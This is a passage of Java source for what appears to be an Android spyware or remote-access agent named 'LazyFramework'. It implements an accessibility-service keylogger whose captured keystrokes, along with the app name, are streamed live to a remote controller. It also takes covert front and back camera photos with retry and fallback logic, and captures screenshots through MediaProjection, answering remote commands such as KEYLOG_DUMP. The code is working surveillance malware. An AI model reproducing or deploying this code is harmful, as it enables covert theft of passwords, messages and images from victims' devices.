                    result.put("instruction", "Go to Settings > Accessibility > LazyFramework Keylogger > Enable");
                    return result.toString();
                }
            }

            service.startLogging();
            isKeyloggingEnabled = true;

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Keylogger started");
            result.put("service_connected", true);
            result.put("is_logging", service.isLogging());
            result.put("total_keystrokes", service.getTotalKeystrokesLogged());
            result.put("queue_size", service.getQueueSize());

            Log.d(TAG, "✅ Keylogger started. Service connected: true");
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Start keylogger error: " + e.getMessage(), e);
            return errorJson("Failed to start keylogger: " + e.getMessage());
        }
    }

    private String stopKeylogger() {
        try {
            Log.d(TAG, "📤 STOP_KEYLOGGER command received");

            KeyloggerService service = ServiceController.getKeyloggerService();

            if (service != null) {
                service.stopLogging();
                isKeyloggingEnabled = false;
                Log.d(TAG, "✅ Keylogger stopped");
            } else {
                Log.w(TAG, "⚠️ KeyloggerService not available");
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Keylogger stopped");
            result.put("keystrokes_captured", service != null ? service.getTotalKeystrokesLogged() : 0);
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Stop keylogger error: " + e.getMessage());
            return errorJson(e.getMessage());
        }
    }

    // AgentService.java - GANTI method dumpKeylogs()

    private String dumpKeylogs() {
        try {
            Log.d(TAG, "📤 DUMP_KEYLOGS command received");

            KeyloggerService service = ServiceController.getKeyloggerService();

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "keylog_dump");
            result.put("timestamp", System.currentTimeMillis());

            if (service != null) {
                // ✅ CEK APAKAH LOGGING AKTIF
                if (!service.isLogging()) {
                    Log.w(TAG, "⚠️ Keylogger is not logging, starting...");
                    service.startLogging();
                    Thread.sleep(500);
                }

                String logs = service.getLogs();

                // ✅ PASTIKAN LOGS TIDAK NULL
                if (logs == null || logs.isEmpty()) {
                    logs = "No keylogs captured yet.\n\n" +
                            "📋 DEBUG INFO:\n" +
                            "  - Service running: " + service.isLogging() + "\n" +
                            "  - Total keystrokes: " + service.getTotalKeystrokesLogged() + "\n" +
                            "  - Queue size: " + service.getQueueSize() + "\n" +
                            "  - History size: " + service.getHistorySize() + "\n\n" +
                            "💡 TROUBLESHOOTING:\n" +
                            "  1. Go to Settings → Accessibility\n" +
                            "  2. Find 'LazyFramework Keylogger'\n" +
                            "  3. ENABLE the service\n" +
                            "  4. Type something in any app\n" +
                            "  5. Run KEYLOG_DUMP again";
                }

                // ✅ TAMBAHKAN SEMUA DATA KE RESULT
                result.put("logs", logs);
                result.put("count", service.getTotalKeystrokesLogged());
                result.put("queue_size", service.getQueueSize());
                result.put("history_size", service.getHistorySize());
                result.put("is_logging", service.isLogging());
                result.put("service_connected", true);

                Log.d(TAG, "📤 Keylog dump result: " + (logs != null ? logs.length() : 0) + " chars");

            } else {
                // ✅ FALLBACK: RESTART SERVICE
                Log.w(TAG, "⚠️ KeyloggerService not available, attempting to restart...");

                Intent intent = new Intent(this, KeyloggerService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }

                int maxRetries = 10;
                int retryCount = 0;

                while (retryCount < maxRetries && service == null) {
                    Thread.sleep(500);
                    service = ServiceController.getKeyloggerService();
                    retryCount++;
                    Log.d(TAG, "⏳ Waiting for KeyloggerService... attempt " + retryCount + "/" + maxRetries);
                }

                if (service != null) {
                    String logs = service.getLogs();
                    if (logs == null || logs.isEmpty()) {
                        logs = "✅ Service restarted successfully!\n" +
                                "   Type something and run KEYLOG_DUMP again.";
                    }
                    result.put("logs", logs);
                    result.put("count", service.getTotalKeystrokesLogged());
                    result.put("queue_size", service.getQueueSize());
                    result.put("history_size", service.getHistorySize());
                    result.put("is_logging", service.isLogging());
                    result.put("service_connected", true);
                    result.put("restarted", true);
                    Log.d(TAG, "📤 Keylog dump after restart: " + (logs != null ? logs.length() : 0) + " chars");
                } else {
                    String errorMsg = "❌ KeyloggerService not available.\n\n" +
                            "📋 TROUBLESHOOTING:\n" +
                            "  1. Go to Settings → Accessibility\n" +
                            "  2. Find 'LazyFramework Keylogger'\n" +
                            "  3. ENABLE the service\n" +
                            "  4. Run KEYLOG_START\n" +
                            "  5. Type something\n" +
                            "  6. Run KEYLOG_DUMP again";
                    result.put("logs", errorMsg);
                    result.put("service_connected", false);
                    result.put("message", "Service unavailable");
                    result.put("instruction", "Enable Accessibility Service in Settings");
                }
            }

            // ✅ KEMBALIKAN RESULT SEBAGAI JSON STRING
            String resultString = result.toString();
            Log.d(TAG, "📤 DUMP_KEYLOGS result: " + resultString.substring(0, Math.min(200, resultString.length())));
            return resultString;

        } catch (Exception e) {
            Log.e(TAG, "Dump keylogs error: " + e.getMessage(), e);
            return errorJson("Failed to dump keylogs: " + e.getMessage());
        }
    }

    private String getKeyloggerStatus() {
        try {
            KeyloggerService keylogger = ServiceController.getKeyloggerService();
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "keylogger_status");

            if (keylogger != null) {
                result.put("is_logging", keylogger.isLogging());
                result.put("total_keystrokes", keylogger.getTotalKeystrokesLogged());
                result.put("queue_size", keylogger.getQueueSize());
            } else {
                result.put("is_logging", false);
                result.put("error", "KeyloggerService not available");
            }

            result.put("timestamp", System.currentTimeMillis());
            return result.toString();
        } catch (Exception e) {
            return errorJson("Failed to get keylogger status: " + e.getMessage());
        }
    }

    private void sendLiveKeylog(String text) {
        if (out == null || !isConnected.get()) return;

        try {
            JSONObject keylog = new JSONObject();
            keylog.put("type", "keylog");
            keylog.put("agent_id", getAgentId());
            keylog.put("timestamp", System.currentTimeMillis());
            keylog.put("key", text);
            keylog.put("app", lastKeylogApp);

            synchronized (out) {
                out.println(keylog.toString());
            }
        } catch (Exception e) {
            // Silent
        }
    }

    public void onKeyLogged(String text) {
        if (!isKeylogging || text == null || text.isEmpty()) return;

        String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
        String logEntry = "[" + timestamp + "] " + text + "\n";

        synchronized (keyLogs) {
            keyLogs.append(logEntry);
            if (keyLogs.length() > 500000) {
                keyLogs.delete(0, 250000);
            }
        }

        sendLiveKeylog(text);
        Log.d(TAG, "📝 Keylogged: " + text.substring(0, Math.min(50, text.length())));
    }

    // ==================== CAMERA SNAPSHOT ====================

// ==================== CAMERA SNAPSHOT WITH RETRY ====================

private String captureCameraSnapshot(String position) throws JSONException {
    // ✅ TRY WITH RETRY - MAX 3 ATTEMPTS
    int maxAttempts = 3;
    String lastError = null;
    
    for (int attempt = 0; attempt < maxAttempts; attempt++) {
        try {
            Log.d(TAG, "📸 Camera attempt " + (attempt + 1) + "/" + maxAttempts + " with " + position + " camera");
            
            if (attempt > 0) {
                // ✅ WAIT BEFORE RETRY
                Thread.sleep(1000 * attempt);
            }
            
            // ✅ RELEASE ANY EXISTING CAMERA FIRST
            releaseCamera();
            
            String result = captureCameraSnapshotInternal(position);
            
            // ✅ CHECK IF SUCCESS
            JSONObject jsonResult = new JSONObject(result);
            if ("success".equals(jsonResult.optString("status"))) {
                return result;
            }
            
            lastError = jsonResult.optString("message", "Unknown error");
            Log.w(TAG, "⚠️ Attempt " + (attempt + 1) + " failed: " + lastError);
            
        } catch (Exception e) {
            lastError = e.getMessage();
            Log.e(TAG, "❌ Attempt " + (attempt + 1) + " error: " + lastError, e);
        }
    }
    
    // ✅ ALL ATTEMPTS FAILED
    JSONObject result = new JSONObject();
    result.put("status", "error");
    result.put("message", "Failed after " + maxAttempts + " attempts: " + lastError);
    result.put("camera", position);
    result.put("suggestion", "Make sure no other app is using the camera and try again");
    return result.toString();
}

// ==================== INTERNAL CAMERA CAPTURE ====================

private String captureCameraSnapshotInternal(String position) throws Exception {
    if (!hasPermission(Manifest.permission.CAMERA)) {
        Log.w(TAG, "📸 Camera permission not granted, requesting...");
        requestCameraPermissionViaActivity();
        
        int maxRetries = 10;
        int retryCount = 0;
        while (!hasPermission(Manifest.permission.CAMERA) && retryCount < maxRetries) {
            Thread.sleep(500);
            retryCount++;
            Log.d(TAG, "⏳ Waiting for camera permission... " + retryCount + "/" + maxRetries);
        }
        
        if (!hasPermission(Manifest.permission.CAMERA)) {
            JSONObject result = new JSONObject();
            result.put("status", "permission_denied");
            result.put("permission", "CAMERA");
            result.put("message", "Camera permission not granted.");
            return result.toString();
        }
    }

    Log.d(TAG, "📸 Camera permission OK, capturing snapshot with " + position + " camera");

    final Object lock = new Object();
    final boolean[] captureComplete = {false};
    final String[] photoBase64 = {null};
    final String[] errorMessage = {null};

    boolean useFrontCamera = "front".equalsIgnoreCase(position);
    
    // ✅ TRY CAMERAX FIRST (MODERN API)
    try {
        return captureWithCameraX(useFrontCamera);
    } catch (Exception e) {
        Log.w(TAG, "⚠️ CameraX failed: " + e.getMessage() + ", trying fallback...");
        return captureWithCameraFallback(useFrontCamera);
    }
}

// ==================== CAMERAX CAPTURE ====================

private String captureWithCameraX(boolean useFrontCamera) throws Exception {
    Log.d(TAG, "📸 Attempting CameraX capture...");
    
    final Object lock = new Object();
    final boolean[] captureComplete = {false};
    final String[] photoBase64 = {null};
    final String[] errorMessage = {null};
    
    ListenableFuture<ProcessCameraProvider> cameraProviderFuture = 
        ProcessCameraProvider.getInstance(this);

    cameraProviderFuture.addListener(() -> {
        try {
            ProcessCameraProvider cameraProvider = cameraProviderFuture.get(5, TimeUnit.SECONDS);
            if (cameraProvider == null) {
                errorMessage[0] = "CameraProvider is null";
                captureComplete[0] = true;
                synchronized (lock) { lock.notify(); }
                return;
            }

            // ✅ RELEASE ANY EXISTING CAMERA
            try {
                cameraProvider.unbindAll();
                Log.d(TAG, "✅ Unbind all previous camera use cases");
            } catch (Exception e) {
                Log.w(TAG, "Unbind error: " + e.getMessage());
            }

            ImageCapture imageCapture = new ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .setTargetRotation(getDisplayRotation())
                .build();

            CameraSelector cameraSelector;
            if (useFrontCamera) {
                cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA;
                Log.d(TAG, "📸 Using FRONT camera");
            } else {
                cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA;
                Log.d(TAG, "📸 Using BACK camera");
            }

            // ✅ TRY SELECTED CAMERA
            try {
                cameraProvider.bindToLifecycle(
                    (LifecycleOwner) this,
                    cameraSelector,
                    imageCapture
                );
                Log.d(TAG, "✅ Camera bound successfully");
            } catch (Exception e) {
                // ✅ FALLBACK TO OTHER CAMERA
                Log.w(TAG, "Selected camera not available, trying alternative: " + e.getMessage());
                if (useFrontCamera) {
                    cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA;
                    Log.d(TAG, "🔄 Falling back to BACK camera");
                } else {
                    cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA;
                    Log.d(TAG, "🔄 Falling back to FRONT camera");
                }
                cameraProvider.bindToLifecycle(
                    (LifecycleOwner) this,
                    cameraSelector,
                    imageCapture
                );
            }

            // ✅ TAKE PICTURE
            imageCapture.takePicture(
                ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageCapturedCallback() {
                    @Override
                    public void onCaptureSuccess(androidx.camera.core.ImageProxy image) {
                        try {
                            if (image == null) {
                                errorMessage[0] = "Image is null";
                                captureComplete[0] = true;
                                synchronized (lock) { lock.notify(); }
                                return;
                            }

                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            
                            byte[] compressed = bytes;
                            if (bytes.length > 2 * 1024 * 1024) {
                                compressed = compressImage(bytes, 80);
                            }
                            
                            photoBase64[0] = Base64.encodeToString(compressed, Base64.NO_WRAP);
                            captureComplete[0] = true;
                            Log.d(TAG, "✅ Photo captured: " + compressed.length + " bytes");
                            
                        } catch (Exception e) {
                            errorMessage[0] = "Processing error: " + e.getMessage();
                            captureComplete[0] = true;
                            Log.e(TAG, "Processing error: " + e.getMessage(), e);
                        } finally {
                            if (image != null) {
                                image.close();
                            }
                            synchronized (lock) { lock.notify(); }
                        }
                    }

                    @Override
                    public void onError(ImageCaptureException exception) {
                        errorMessage[0] = "Capture failed: " + exception.getMessage();
                        captureComplete[0] = true;
                        Log.e(TAG, "Capture failed: " + exception.getMessage(), exception);
                        synchronized (lock) { lock.notify(); }
                    }
                }
            );

        } catch (Exception e) {
            errorMessage[0] = "Setup failed: " + e.getMessage();
            captureComplete[0] = true;
            Log.e(TAG, "Setup error: " + e.getMessage(), e);
            synchronized (lock) { lock.notify(); }
        }
    }, ContextCompat.getMainExecutor(this));

    // ✅ WAIT WITH TIMEOUT
    synchronized (lock) {
        if (!captureComplete[0]) {
            try {
                lock.wait(15000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                Log.w(TAG, "Wait interrupted");
            }
        }
    }

    // ✅ HANDLE ERRORS
    if (errorMessage[0] != null) {
        throw new Exception(errorMessage[0]);
    }

    if (photoBase64[0] == null) {
        throw new Exception("No photo captured");
    }

    // ✅ SUCCESS
    JSONObject result = new JSONObject();
    result.put("status", "success");
    result.put("type", "camera_snapshot");
    result.put("timestamp", System.currentTimeMillis());
    result.put("image_data", photoBase64[0]);
    result.put("size", photoBase64[0].length());
    result.put("camera", useFrontCamera ? "front" : "back");
    result.put("method", "camerax");
    result.put("message", "Camera snapshot captured");
    return result.toString();
}

// ==================== FALLBACK CAMERA CAPTURE (OLD API) ====================

private String captureWithCameraFallback(boolean useFrontCamera) throws Exception {
    Log.d(TAG, "📸 Using FALLBACK camera method");
    Camera camera = null;
    
    try {
        // ✅ FIND CAMERA ID
        int cameraId = -1;
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        
        Log.d(TAG, "📸 Number of cameras: " + numberOfCameras);
        
        if (useFrontCamera) {
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = i;
                    break;
                }
            }
        } else {
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = i;
                    break;
                }
            }
        }

        // ✅ IF NO MATCH, USE DEFAULT
        if (cameraId == -1) {
            cameraId = 0;
            Log.w(TAG, "⚠️ No matching camera found, using default: 0");
        }

        Log.d(TAG, "📸 Opening camera: " + cameraId);

        // ✅ OPEN CAMERA WITH RETRY
        int openAttempts = 3;
        for (int i = 0; i < openAttempts; i++) {
            try {
                camera = Camera.open(cameraId);
                if (camera != null) {
                    break;
                }
                Log.w(TAG, "⚠️ Camera open attempt " + (i + 1) + " failed, retrying...");
                Thread.sleep(500);
            } catch (Exception e) {
                Log.w(TAG, "⚠️ Camera open error attempt " + (i + 1) + ": " + e.getMessage());
                if (i == openAttempts - 1) throw e;
                Thread.sleep(500);
            }
        }

        if (camera == null) {
            throw new Exception("Cannot open camera (null)");
        }

        // ✅ SET PARAMETERS
        Camera.Parameters params = camera.getParameters();
        if (params != null) {
            // Picture size
            List<Camera.Size> sizes = params.getSupportedPictureSizes();
            if (sizes != null && !sizes.isEmpty()) {
                Camera.Size bestSize = sizes.get(0);
                for (Camera.Size size : sizes) {
                    if (size.width <= 1920 && size.height <= 1080) {
                        bestSize = size;
                        break;
                    }
                }
                params.setPictureSize(bestSize.width, bestSize.height);
                Log.d(TAG, "📸 Picture size: " + bestSize.width + "x" + bestSize.height);
            }
            
            // JPEG quality
            params.setJpegQuality(85);
            
            // Focus mode
            List<String> focusModes = params.getSupportedFocusModes();
            if (focusModes != null) {
                if (focusModes.contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                } else if (focusModes.contains(Camera.Parameters.FOCUS_MODE_INFINITY)) {
                    params.setFocusMode(Camera.Parameters.FOCUS_MODE_INFINITY);
                }
            }
            
            camera.setParameters(params);
        }

        // ✅ START PREVIEW (required)
        try {
            camera.startPreview();
            Log.d(TAG, "✅ Preview started");
        } catch (Exception e) {
            Log.w(TAG, "Preview start error: " + e.getMessage());
        }

        // ✅ WAIT FOR PREVIEW
        Thread.sleep(300);

        final Object lock = new Object();
        final boolean[] captureComplete = {false};
        final String[] photoBase64 = {null};
        final String[] errorMessage = {null};

        Log.d(TAG, "📸 Taking picture with fallback...");
        
        // ✅ TAKE PICTURE
        camera.takePicture(
            null,
            null,
            new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        if (data != null && data.length > 0) {
                            Log.d(TAG, "📸 Photo captured: " + data.length + " bytes");
                            
                            byte[] compressed = data;
                            if (data.length > 2 * 1024 * 1024) {
                                compressed = compressImage(data, 80);
                            }
                            
                            photoBase64[0] = Base64.encodeToString(compressed, Base64.NO_WRAP);
                        } else {
                            errorMessage[0] = "No image data received";
                            Log.e(TAG, "❌ No image data");
                        }
                    } catch (Exception e) {
                        errorMessage[0] = "Processing error: " + e.getMessage();
                        Log.e(TAG, "❌ Processing error: " + e.getMessage(), e);
                    }
                    captureComplete[0] = true;
                    synchronized (lock) { lock.notify(); }
                }
            }
        );

        // ✅ WAIT FOR CAPTURE
        synchronized (lock) {
            if (!captureComplete[0]) {
                try {
                    lock.wait(15000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    Log.w(TAG, "Wait interrupted");
                }
            }
        }

        // ✅ RELEASE CAMERA
        releaseCamera(camera);
        camera = null;

        // ✅ HANDLE ERRORS
        if (errorMessage[0] != null) {
            throw new Exception(errorMessage[0]);
        }

        if (photoBase64[0] == null) {
            throw new Exception("No photo captured");
        }

        // ✅ SUCCESS
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "camera_snapshot");
        result.put("timestamp", System.currentTimeMillis());
        result.put("image_data", photoBase64[0]);
        result.put("size", photoBase64[0].length());
        result.put("camera", useFrontCamera ? "front" : "back");
        result.put("method", "fallback");
        result.put("message", "Camera snapshot captured with fallback");
        return result.toString();

    } finally {
        if (camera != null) {
            try {
                camera.release();
                Log.d(TAG, "✅ Camera released");
            } catch (Exception e) {
                Log.w(TAG, "Camera release error: " + e.getMessage());
            }
        }
    }
}

// ==================== RELEASE CAMERA HELPERS ====================

private void releaseCamera() {
    // ✅ Release any existing camera instance
    try {
        // Try CameraX
        ProcessCameraProvider provider = ProcessCameraProvider.getInstance(this).get(1, TimeUnit.SECONDS);
        if (provider != null) {
            provider.unbindAll();
            Log.d(TAG, "✅ CameraX unbound");
        }
    } catch (Exception e) {
        // Ignore
    }
    
    // ✅ Release old Camera API
    try {
        // Try to open and release to force close
        Camera camera = Camera.open(0);
        if (camera != null) {
            camera.release();
            Log.d(TAG, "✅ Old camera released");
        }
    } catch (Exception e) {
        // Ignore - camera might not be available
    }
}

private void releaseCamera(Camera camera) {
    if (camera != null) {
        try {
            camera.stopPreview();
        } catch (Exception ignored) {}
        try {
            camera.release();
        } catch (Exception ignored) {}
    }
}

// ==================== CAMERA PERMISSION REQUEST ====================

private void requestCameraPermissionViaActivity() {
    try {
        Intent intent = new Intent(this, MainActivity.class);
        intent.putExtra("action", "request_camera_permission");
        intent.putExtra("agent_id", getAgentId());
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
        Log.d(TAG, "📸 Camera permission requested via MainActivity");
    } catch (Exception e) {
        Log.e(TAG, "Failed to request camera permission: " + e.getMessage());
    }
}

// ==================== COMPRESS IMAGE ====================

private byte[] compressImage(byte[] imageData, int quality) {
    try {
        Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
        if (bitmap == null) {
            return imageData;
        }
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        bitmap.recycle();
        return baos.toByteArray();
    } catch (Exception e) {
        Log.e(TAG, "Compress error: " + e.getMessage());
        return imageData;
    }
}

// ==================== GET DISPLAY ROTATION ====================

private int getDisplayRotation() {
    try {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            return wm.getDefaultDisplay().getRotation();
        }
    } catch (Exception e) {
        Log.w(TAG, "Get display rotation error: " + e.getMessage());
    }
    return 0;
}




private String getCameraInfo() {
    try {
        PackageManager pm = getPackageManager();
        boolean hasBack = pm.hasSystemFeature(PackageManager.FEATURE_CAMERA);
        boolean hasFront = pm.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT);
        
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("has_back_camera", hasBack);
        result.put("has_front_camera", hasFront);
        result.put("has_camera", hasBack || hasFront);
        return result.toString();
    } catch (Exception e) {
        return errorJson(e.getMessage());
    }
}

// ✅ METHOD TERPISAH UNTUK TAKE PICTURE
private void takePictureInternal(Camera camera, Object lock, boolean[] captureComplete, 
                                   String[] photoBase64, String[] errorMessage) {
    try {
        camera.takePicture(
            null, // shutter
            null, // raw
            new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        if (data != null && data.length > 0) {
                            Log.d(TAG, "📸 Photo captured: " + data.length + " bytes");
                            
                            // Kompres jika terlalu besar
                            byte[] compressedData = data;
                            if (data.length > 2 * 1024 * 1024) {
                                compressedData = compressImage(data, 80);
                                Log.d(TAG, "📸 Compressed: " + compressedData.length + " bytes");
                            }

                            photoBase64[0] = Base64.encodeToString(compressedData, Base64.NO_WRAP);
                            captureComplete[0] = true;
                            
                            // Restart preview setelah capture
                            try {
                                camera.startPreview();
                            } catch (Exception e) {
                                Log.w(TAG, "Restart preview error: " + e.getMessage());
                            }
                        } else {
                            errorMessage[0] = "No image data received";
                            captureComplete[0] = true;
                        }
                    } catch (Exception e) {
                        errorMessage[0] = "Error processing photo: " + e.getMessage();
                        captureComplete[0] = true;
                        Log.e(TAG, "Photo capture error: " + e.getMessage());
                    } finally {
                        synchronized (lock) {
                            lock.notify();
                        }
                    }
                }
            }
        );
    } catch (Exception e) {
        errorMessage[0] = "takePicture failed: " + e.getMessage();
        captureComplete[0] = true;
        synchronized (lock) {
            lock.notify();
        }
        Log.e(TAG, "takePicture error: " + e.getMessage());
    }
}



    private Camera.Size getBestPictureSize(List<Camera.Size> sizes) {
        if (sizes == null || sizes.isEmpty()) return null;

        int targetWidth = 2048;
        int targetHeight = 1536;
        Camera.Size bestSize = sizes.get(0);
        int bestDiff = Integer.MAX_VALUE;

        for (Camera.Size size : sizes) {
            int diff = Math.abs(size.width - targetWidth) + Math.abs(size.height - targetHeight);
            if (diff < bestDiff) {
                bestDiff = diff;
                bestSize = size;
            }
        }

        return bestSize;
    }



    // ==================== SCREENSHOT - FIXED ====================

    // AgentService.java - Ganti captureScreenshot()

    private String captureScreenshot() throws JSONException {
        try {
            Log.d(TAG, "📸 Starting screenshot capture...");

            // ✅ PRIORITAS: Ambil dari ScreenMirrorHelper jika aktif
            ScreenMirrorHelper helper = ServiceController.getScreenMirrorHelper();

            if (helper != null && helper.isCapturing()) {
                // TAMBAHKAN METHOD getLastFrame() di ScreenMirrorHelper
                Bitmap frame = helper.getLastFrame();
                if (frame != null) {
                    Log.d(TAG, "✅ Screenshot from active mirror: " + frame.getWidth() + "x" + frame.getHeight());
                    return processScreenshot(frame);
                }
                Log.w(TAG, "⚠️ Mirror active but no frame available");
            }

            // FALLBACK: Coba MediaProjection
            MediaProjection projection = ServiceController.getMediaProjection();

            if (projection == null) {
                Log.w(TAG, "⚠️ MediaProjection NULL - requesting permission...");

                Intent intent = new Intent(this, MainActivity.class);
                intent.putExtra("action", "request_screenshot_permission");
                intent.putExtra("agent_id", getAgentId());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);

                int waitCount = 0;
                int maxWait = 20;
                while (projection == null && waitCount < maxWait) {
                    Thread.sleep(500);
                    projection = ServiceController.getMediaProjection();
                    waitCount++;
                    Log.d(TAG, "⏳ Waiting for projection... " + waitCount + "/" + maxWait);
                }
            }

            if (projection == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Screen recording permission not granted!");
                result.put("instruction", "Please run SCREEN_START first to grant permission.");
                return result.toString();
            }

            Log.d(TAG, "✅ MediaProjection available, capturing...");
            Bitmap screenshot = takeScreenshotWithMediaProjection(projection);

            if (screenshot == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Failed to capture screen image");
                return result.toString();
            }

            Log.d(TAG, "✅ Screenshot captured: " + screenshot.getWidth() + "x" + screenshot.getHeight());
            return processScreenshot(screenshot);

        } catch (Exception e) {
            Log.e(TAG, "❌ Screenshot error: " + e.getMessage(), e);
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", e.getMessage());
            return result.toString();
        }
    }

    // ✅ TAMBAHKAN VERSI SIMPLIFIED - SCREENSHOT DENGAN MEDIAPROJECTION
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private Bitmap takeScreenshotWithMediaProjection(MediaProjection projection) {
        if (projection == null) {
            Log.e(TAG, "❌ Projection is null!");
            return null;
        }

        ImageReader reader = null;
        VirtualDisplay virtualDisplay = null;

        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) {
                Log.e(TAG, "❌ WindowManager null");
                return null;
            }

            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            Log.d(TAG, "📱 Screen: " + width + "x" + height + " @ " + density + "dpi");

            reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

            // ✅ GUNAKAN VIRTUAL_DISPLAY_FLAG_PUBLIC agar bisa diakses
            virtualDisplay = projection.createVirtualDisplay(
                    "LazyScreenshot_" + System.currentTimeMillis(), // NAMA UNIK
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR |
                            DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
                    reader.getSurface(),
                    null, null
            );

            // ✅ TUNGGU LEBIH LAMA
            Bitmap bitmap = null;
            Image image = null;

            for (int i = 0; i < 20; i++) {
                Thread.sleep(200);
                image = reader.acquireLatestImage();
                if (image != null) {
                    Log.d(TAG, "✅ Image acquired at attempt " + (i + 1));
                    bitmap = convertImageToBitmap(image);
                    image.close();
                    if (bitmap != null) break;
                }
                Log.d(TAG, "⏳ Waiting for image... " + (i + 1) + "/20");
            }

            return bitmap;

        } catch (Exception e) {
            Log.e(TAG, "❌ Screenshot error: " + e.getMessage(), e);
            return null;
        } finally {
            // ✅ RELEASE VIRTUALDISPLAY SETELAH SCREENSHOT
            if (virtualDisplay != null) {
                try {
                    virtualDisplay.release();
                    Log.d(TAG, "✅ VirtualDisplay released");
                } catch (Exception e) {}
            }
            if (reader != null) {
                try {
                    reader.close();
                    Log.d(TAG, "✅ ImageReader closed");
                } catch (Exception e) {}
            }
        }
    }

    // ✅ TAMBAHKAN - Convert Image ke Bitmap
    // AgentService.java - TAMBAHKAN method ini

    private Bitmap convertImageToBitmap(Image image) {
        if (image == null) {
            Log.e(TAG, "❌ Image is null");
            return null;
        }

        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                Log.e(TAG, "❌ No planes in image");
                return null;
            }

            ByteBuffer buffer = planes[0].getBuffer();
            if (buffer == null) {
                Log.e(TAG, "❌ Buffer is null");
                return null;
            }

            int width = image.getWidth();
            int height = image.getHeight();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();

            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            if (rowStride == pixelStride * width) {
                bitmap.copyPixelsFromBuffer(buffer);
            } else {
                ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
                for (int row = 0; row < height; row++) {
                    buffer.position(row * rowStride);
                    byte[] rowData = new byte[width * 4];
                    buffer.get(rowData);
                    dstBuffer.put(rowData);
                }
                dstBuffer.rewind();
                bitmap.copyPixelsFromBuffer(dstBuffer);
            }

            return bitmap;

        } catch (Exception e) {
            Log.e(TAG, "❌ convertImageToBitmap error: " + e.getMessage(), e);
            return null;
        }
    }

    private Bitmap imageToBitmap(Image image) {
        if (image == null) return null;

        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) return null;

            ByteBuffer buffer = planes[0].getBuffer();
            if (buffer == null) return null;

            int width = image.getWidth();
            int height = image.getHeight();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();

            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            if (rowStride == pixelStride * width) {
                bitmap.copyPixelsFromBuffer(buffer);
            } else {
                ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
                for (int row = 0; row < height; row++) {
                    buffer.position(row * rowStride);
                    byte[] rowData = new byte[width * 4];
                    buffer.get(rowData);
                    dstBuffer.put(rowData);
                }
                dstBuffer.rewind();
                bitmap.copyPixelsFromBuffer(dstBuffer);
            }

            return bitmap;

        } catch (Exception e) {
            Log.e(TAG, "imageToBitmap error: " + e.getMessage());
            return null;
        }
    }

    private Bitmap takeScreenshotViaView() {
        try {
            Log.d(TAG, "📸 Trying View-based screenshot...");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
